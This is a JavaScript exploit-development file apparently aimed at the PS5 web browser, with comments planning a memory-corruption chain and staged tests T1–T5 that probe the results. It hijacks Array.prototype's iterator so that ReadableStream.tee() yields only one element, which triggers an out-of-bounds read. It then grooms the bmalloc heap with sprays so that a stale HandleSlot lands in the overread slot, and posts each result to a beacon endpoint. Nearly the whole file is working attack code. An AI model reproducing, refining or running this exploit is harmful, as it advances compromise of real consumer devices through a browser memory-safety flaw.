/*
 * p437 -- tee() OOB with controlled heap spray
 *
 * V435 confirmed: OOB read at Vector data[1] CRASHES the PS5 browser.
 * This means the uninitialized bytes form an invalid pointer.
 *
 * The crash happens because bmalloc stores free-list metadata in freed
 * blocks. We need to pre-fill the 128-byte block with controlled data
 * BEFORE the Vector is allocated.
 *
 * Strategy:
 *   1. Spray 128-byte objects with controlled content
 *   2. Free specific ones to create holes in bmalloc free-list
 *   3. Trigger under-yield tee -- Vector allocation fills a hole
 *   4. data[1] at offset 8 now has our controlled bytes
 *
 * For Strong<JSObject> at data[1]:
 *   m_slot (8 bytes) must be a valid readable address
 *   *m_slot must be a valid JSValue (8 bytes)
 *   JSValue.asCell() must be a valid JSObject pointer
 *
 * So we need a cascade:
 *   data[1] -> address A (must be readable)
 *   *A -> 8 bytes that encode a JSValue with a cell pointer
 *   The cell must look like a JSObject
 *
 * Simplest approach: make data[1] = 0 (nullptr)
 *   Strong::get() checks if m_slot is null -> returns nullptr
 *   results[1].get() returns nullptr -> *nullptr = crash
 *
 * Better: make data[1] = address of our controlled ArrayBuffer data
 *   ArrayBuffer data is in aux space (no Gigacage on PS5!)
 *   We write a fake JSValue into the AB data
 *   The JSValue points to our fake object (another AB)
 *
 * But we need to KNOW the AB data address. Info leak required first.
 * Without info leak, we need to find a way to get a VALID pointer
 * into data[1] that survives through the allocation cycle.
 *
 * Alternative: instead of grooming the 128-byte block, groom the
 * HandleSet to control what JSValue a stale HandleSlot contains.
 *
 * HandleSet approach:
 *   1. Create Strong S1 pointing to our victim object V
 *   2. S1 allocates HandleSlot H from HandleSet
 *   3. H contains JSValue(V)
 *   4. Destroy S1 (marks H as free in HandleSet, but doesn't zero H)
 *   5. Under-yield: data[1] in Vector must equal address of H
 *   6. Strong::get reads *H = JSValue(V) -> returns V
 *   7. fromObject wraps V as InternalReadableStream
 *
 * For step 5, we need the Vector block to have H's address at offset 8.
 * This happens if a PREVIOUS Vector stored H at its data[1] position.
 * Which happens with normal tees! Each normal tee creates Vector with
 * data[1] = HandleSlot of branch2.
 *
 * Problem: normal tee destroys the Vector AND the Strong. The Strong
 * destruction marks H as free. But H's bytes aren't zeroed!
 *
 * So if no new Strong reuses H between normal tee destruction and
 * under-yield tee, then data[1] = H's address, *H = stale JSValue(branch2).
 * If branch2 is still alive, this works. If branch2 was GC'd, the cell
 * is freed and we crash.
 *
 * Key insight: we need to keep branch2 ALIVE while ensuring no new
 * Strong reuses HandleSlot H. The normal tee's branches[] array keeps
 * branch1/branch2 alive. We just need to NOT create new Strongs between
 * the last normal tee and the under-yield tee.
 *
 * V435 approach did this but still crashed. Why?
 * Because bmalloc may not return the EXACT same 128-byte block.
 * The Vector from the last spray tee might not be reused by the under-yield.
 * If an older block is reused, its data[1] = an even older HandleSlot that
 * was already reclaimed.
 *
 * Better approach: spray MANY tees, then immediately under-yield.
 * With LIFO free-list, the LAST freed block is returned first.
 * So the under-yield Vector should get the block from the LAST spray tee.
 * And that HandleSlot is the most recently freed one.
 *
 * Even better: use ONLY ONE spray tee immediately before the under-yield.
 * That way there's only one freed 128-byte block, and it's the one we want.
 *
 * Tests in order (safe first, dangerous last):
 *   T1: Diagnostic -- capture branch2 from normal tee, check properties
 *   T2: Single spray + immediate under-yield (minimal, LIFO)
 *   T3: Exhaust free-list first (many allocs), single spray, under-yield
 *   T4: 10 sprays + under-yield (slightly more)
 *   T5: Crash oracle -- bare under-yield, no spray
 *
 * Beacon prefix: V437-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V437-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function makeStream(data) {
  return new ReadableStream({
    start: function(c) {
      c.enqueue(data || "x");
      c.close();
    }
  });
}

// Normal tee -- returns branches + keeps internal refs alive
function normalTee(data) {
  var rs = makeStream(data);
  var internals = null;
  var hooked = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !hooked) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        hooked = true;
        internals = {b1: self[0], b2: self[1]};
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, internals: internals, hooked: hooked};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }
}

// Under-yield tee -- returns 1 element
function underYieldTee(data) {
  var rs = makeStream(data);
  var hooked = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !hooked) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        hooked = true;
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, hooked: hooked};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return {err: e.message.slice(0, 120), hooked: hooked};
  }
}

function probeOOB(label, r) {
  if (r.err) {
    B(label + "-ERR", r.err);
    return;
  }
  if (!r.branches) {
    B(label + "-NO-BRANCHES");
    return;
  }

  var b0 = r.branches[0];
  var b1 = r.branches[1];

  try {
    B(label + "-B0", {
      type: typeof b0,
      ctor: b0 && b0.constructor ? b0.constructor.name : "?",
    });
  } catch(e) {
    B(label + "-B0-ERR", e.message.slice(0, 60));
  }

  if (b1 === undefined) {
    B(label + "-B1-UNDEF");
    return;
  }
  if (b1 === null) {
    B(label + "-B1-NULL");
    return;
  }

  try {
    B(label + "-B1-TYPE", typeof b1);
  } catch(e) {
    B(label + "-B1-TYPEOF-ERR", e.message.slice(0, 60));
    return;
  }

  try {
    B(label + "-B1-CTOR", b1.constructor ? b1.constructor.name : "none");
  } catch(e) {
    B(label + "-B1-CTOR-ERR", e.message.slice(0, 60));
  }

  try {
    B(label + "-B1-ISRS", b1 instanceof ReadableStream);
  } catch(e) {
    B(label + "-B1-ISRS-ERR", e.message.slice(0, 60));
  }

  // Try .locked
  try {
    var locked = b1.locked;
    B(label + "-B1-LOCKED", String(locked));
  } catch(e) {
    B(label + "-B1-LOCKED-ERR", e.message.slice(0, 60));
  }

  // Try getReader
  try {
    var reader = b1.getReader();
    B(label + "-B1-READER-OK!!!");
    reader.read().then(function(chunk) {
      B(label + "-B1-READ", {done: chunk.done, val: chunk.value === undefined ? "undef" : String(chunk.value).slice(0, 60)});
      try { reader.releaseLock(); } catch(e) {}
    }).catch(function(e) {
      B(label + "-B1-READ-ERR", e.message.slice(0, 60));
    });
  } catch(e) {
    B(label + "-B1-READER-ERR", e.message.slice(0, 60));
  }
}

// ================================================================
// T1: Diagnostic -- what does the internal branch2 look like
// ================================================================
function T1() {
  B("T1-START");
  var t = normalTee("diag");
  if (!t || !t.internals) {
    B("T1-NO-INTERNALS");
    return;
  }
  var b2 = t.internals.b2;
  B("T1-B2-CTOR", b2.constructor ? b2.constructor.name : "?");
  B("T1-B2-PROTO", Object.getPrototypeOf(b2) === Object.prototype ? "Object.prototype" : "other");

  var keys = Object.getOwnPropertyNames(b2);
  B("T1-B2-KEYS", keys.join(",") || "none");

  var syms = Object.getOwnPropertySymbols(b2);
  B("T1-B2-SYMS", syms.length);

  // Keep alive
  B("T1-OK", {hooked: t.hooked});
}

// ================================================================
// T2: Single spray + immediate under-yield
// LIFO should give us the exact same 128-byte block
// ================================================================
function T2() {
  B("T2-START");

  // Exhaust the current 128-byte free-list to force fresh allocation
  var exhaust = [];
  for (var i = 0; i < 50; i++) {
    exhaust.push(new ArrayBuffer(120)); // slightly under 128 to hit same class
  }
  B("T2-EXHAUSTED", exhaust.length);

  // Single normal tee -- its Vector will be the LAST freed 128-byte block
  var spray = normalTee("t2-spray");
  B("T2-SPRAY-OK", !!spray);

  // IMMEDIATELY under-yield -- LIFO should return same block
  var r = underYieldTee("t2-data");
  probeOOB("T2", r);

  // Keep spray alive so branch2 cell is still valid
  B("T2-SPRAY-ALIVE", !!spray);
}

// ================================================================
// T3: Exhaust + 3 sprays + under-yield
// More sprays = more freed blocks, but LIFO means last is returned
// ================================================================
function T3() {
  B("T3-START");

  var exhaust = [];
  for (var i = 0; i < 100; i++) {
    exhaust.push(new ArrayBuffer(120));
  }

  var sprays = [];
  for (var i = 0; i < 3; i++) {
    var t = normalTee("t3-" + i);
    if (t) sprays.push(t);
  }
  B("T3-SPRAYED", sprays.length);

  var r = underYieldTee("t3-data");
  probeOOB("T3", r);

  B("T3-ALIVE", sprays.length);
}

// ================================================================
// T4: 10 sprays + under-yield (without exhaust)
// ================================================================
function T4() {
  B("T4-START");

  var sprays = [];
  for (var i = 0; i < 10; i++) {
    var t = normalTee("t4-" + i);
    if (t) sprays.push(t);
  }
  B("T4-SPRAYED", sprays.length);

  var r = underYieldTee("t4-data");
  probeOOB("T4", r);

  B("T4-ALIVE", sprays.length);
}

// ================================================================
// T5: Crash oracle -- bare under-yield, no spray at all
// If previous tests already primed the free list, this might work
// ================================================================
function T5() {
  B("T5-START");
  var r = underYieldTee("t5-oracle");
  probeOOB("T5", r);
}

// Schedule: diagnostic first, then increasing danger
// T2 is the most likely to succeed (exhaust + single spray + LIFO)
setTimeout(function() { T1(); }, 100);
setTimeout(function() { T2(); }, 500);
setTimeout(function() { T3(); }, 2000);
setTimeout(function() { T4(); }, 4000);
setTimeout(function() { T5(); }, 6000);
setTimeout(function() { B("DONE"); }, 9000);

setInterval(function() { B("HB"); }, 15000);
})();
